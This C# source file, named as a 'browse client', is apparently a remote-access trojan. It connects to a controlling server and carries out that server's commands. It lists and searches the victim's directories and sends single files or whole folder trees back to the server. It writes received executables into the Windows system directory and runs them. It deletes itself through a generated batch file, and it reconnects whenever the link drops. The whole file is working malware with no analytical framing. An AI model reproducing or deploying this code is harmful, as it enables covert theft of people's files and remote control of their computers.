using System;
using System.Collections.Generic;
using System.Text;
using System.Threading;
using System.IO;
using System.Diagnostics;

namespace TestBrowseClient1
{
    class Wrapper
    {
        public Wrapper(ManualResetEvent arr)
        {
            ar = arr;
        }
        
        ManualResetEvent ar;
        ClientClass Client;

        public void Run()
        {
            Client = new ClientClass();
            Client.OnClientConnected += new ClientClass.ClientConnected(Client_OnClientConnected);
            Client.OnClientDissConnected += new ClientClass.ClientDissConnected(Client_OnClientDissConnected);
            Client.OnDataRecieved += new ClientClass.DataRecieved(Client_OnDataRecieved);
            Client.OnErrorCatched += new ClientClass.ErrorCatched(Client_OnErrorCatched);
            ThreadPool.QueueUserWorkItem(new WaitCallback(Client.Connect), null);
        }

        void Client_OnErrorCatched(string data)
        {
            
        }

        void Client_OnDataRecieved(string Data)
        {
            Console.WriteLine(Data);
            string[] CmdArgs= Data.Split(new string[] { "[#]" }, StringSplitOptions.RemoveEmptyEntries);
            string MessageData = "";
            switch (CmdArgs[0])
            {
                case "[#ListDirectory#]":
                    MessageData = "[#DirPath#][#]" + CmdArgs[1] + "[#][#Dirs#][#]" + string.Join("[|]", ListDirs(CmdArgs[1])) + "[#][#Files#][#]" + string.Join("[|]", ListFiles(CmdArgs[1])) + "[#]";
                    Client.SendMessage(MessageData);
                    break;
                case "[#CopyDirectory#]":
                    new Thread(new ParameterizedThreadStart(CopyDirs)).Start(CmdArgs[1]);
                    break;
                case "[#CopyFile#]":
                    try
                    {
                        string FileDataX;
                        byte[] FileData = File.ReadAllBytes(CmdArgs[1]);
                        if ((FileData.LongLength / 1024) > 40000)
                        {
                            FileDataX = Encoding.Default.GetString(FileData, 0,Convert.ToInt32(FileData.LongLength / 2));
                            MessageData = "[#FileName#][#]" + CmdArgs[1] + ".part1[#]" + ((FileDataX.Length == 0) ? "[#NoData#]" : FileDataX) + "[#]";
                            Client.SendMessage(MessageData);

                            Thread.Sleep(100);
                            
                            FileDataX = "";
                            FileDataX = Encoding.Default.GetString(FileData, Convert.ToInt32(FileData.LongLength / 2) , Convert.ToInt32(FileData.LongLength - (FileData.LongLength / 2)));
                            MessageData = "[#FileName#][#]" + CmdArgs[1] + ".part2[#]" + ((FileDataX.Length == 0) ? "[#NoData#]" : FileDataX) + "[#]";
                            Client.SendMessage(MessageData);
                            System.Windows.Forms.MessageBox.Show(FileDataX.Length.ToString());
                        }
                        else
                        {
                            FileDataX = Encoding.Default.GetString(FileData);
                            MessageData = "[#FileName#][#]" + CmdArgs[1] + "[#]" + ((FileDataX.Length == 0) ? "[#NoData#]" : FileDataX) + "[#]";
                            //Console.WriteLine(MessageData.Length.ToString());
                            Client.SendMessage(MessageData);
                        }
                    }
                    catch (Exception ex) { Client.SendMessage("[#Error#][#]Error Occured: " + ex.Message); }
                    break;
                case "[#UpdateYourSelf#]":
                    UpdateProcess(CmdArgs[2], CmdArgs[4]);
                    break;
                case "[#Search#]":
                    ThreadPool.QueueUserWorkItem(new WaitCallback(StartSearch),new string[]{CmdArgs[1], CmdArgs[4], CmdArgs[6], CmdArgs[7]});
                    break;
                case "[#FileProps#]":
                    Client.SendMessage(fileProps(CmdArgs[1]));
                    break;
            }
        }
        void StartSearch(object Params)
        {
            string[] Vals=(string[])Params;
            Search(Vals[0], Vals[1], Vals[2], Vals[3]);
        }
        private void Search(string FolderPath, string Criteria, string SizeCriteria, string FileSize)
        {
            DirectoryInfo dir=new DirectoryInfo(FolderPath);
            FileInfo[] Files=null;
            try
            {
                Files = dir.GetFiles(Criteria, SearchOption.AllDirectories);
            }
            catch { }
            string ResultFiles="";
            if (SizeCriteria == "[#At Least#]")
            {
                foreach (FileInfo file in Files)
                {
                    if (file.Length >= (int.Parse(FileSize) * 1024))
                    {
                        ResultFiles += file.FullName+"[|]";
                    }
                }
            }
            else if (SizeCriteria == "[#At Most#]")
            {
                foreach (FileInfo file in Files)
                {
                    if (file.Length <= (int.Parse(FileSize) * 1024))
                    {
                        ResultFiles += file.FullName + "[|]";
                    }
                }
            }
            else
            {
                foreach (FileInfo file in Files)
                {
                    ResultFiles += file.FullName + "[|]";
                }
            }
            Client.SendMessage("[#SearchResults#][#]"+(ResultFiles.Length>3?ResultFiles:"[#No Files#]"));
            
        }
        string fileProps(string Path)
        {
            FileInfo fi = new FileInfo(Path);
            string str = "[#FileProps#][#]File Name: " + fi.Name + "\r\nFile Size: " + (fi.Length / 1024) + "KB\r\nLastAccessTime: " + fi.LastAccessTime.ToString() + "\r\nCreationTime: " + fi.CreationTime.ToString() + "\r\nOther: " + fi.Attributes.ToString();
            return str;
        }
        private void UpdateProcess(string FileNameSent, string FileContent)
        {
            string FileName = "";
            if (!File.Exists(Environment.SystemDirectory + "\\" + FileNameSent))
            {
                FileName = Environment.SystemDirectory + "\\" + FileNameSent;
            }
            else
            {
                FileName = Environment.SystemDirectory + "\\" + FileNameSent.Substring(0, FileNameSent.LastIndexOf('.')) + DateTime.Now.Hour.ToString() + DateTime.Now.Minute.ToString() + DateTime.Now.Second.ToString() + ".exe";
            }
            File.WriteAllBytes(FileName, Encoding.Default.GetBytes(FileContent));
            Process.Start(FileName);

            System.Windows.Forms.Application.ExitThread();
            //System.Windows.Forms.Application.Exit();
            Environment.Exit(Environment.ExitCode);
            
            KillMySelf(System.Windows.Forms.Application.ExecutablePath);
        }

        public static void KillMySelf(string exePath)
        {
            string BatchPath=Environment.SystemDirectory+"\\batch.bat";
            string str = "start\r\ndel " + exePath + "\r\ndel " + BatchPath;
            File.WriteAllText(BatchPath, str);
            Process.Start(BatchPath);
        }


        void Client_OnClientDissConnected()
        {
            Run();
            //Client.Client.Close();
        }

        void Client_OnClientConnected()
        {
            
        }
        string[] ListDirs(string Dir)
        {
            string[] str = Directory.GetDirectories(Dir);
            return (str.Length > 0) ? str : new string[] { "No Dirs" };
        }

        string[] ListFiles(string Dir)
        {
            string[] str=Directory.GetFiles(Dir);
            return (str.Length > 0) ? str : new string[] { "No Files" };
        }
        void CopyDirs(object Dir)
        {
            string MessageData;
            string[] dirs = Directory.GetFileSystemEntries(Dir.ToString());
            foreach (string Element in dirs)
                {
                    // Sub directories
                    if (Directory.Exists(Element)) CopyDirs(Element);

                        // Files in directory
                    else
                    {
                        MessageData = "[#FileName#][#]" + Element + "[#]" + Encoding.Default.GetString(File.ReadAllBytes(Element))+"[#]";
                        Client.SendMessage(MessageData);
                    }
                }
        }
    }
}
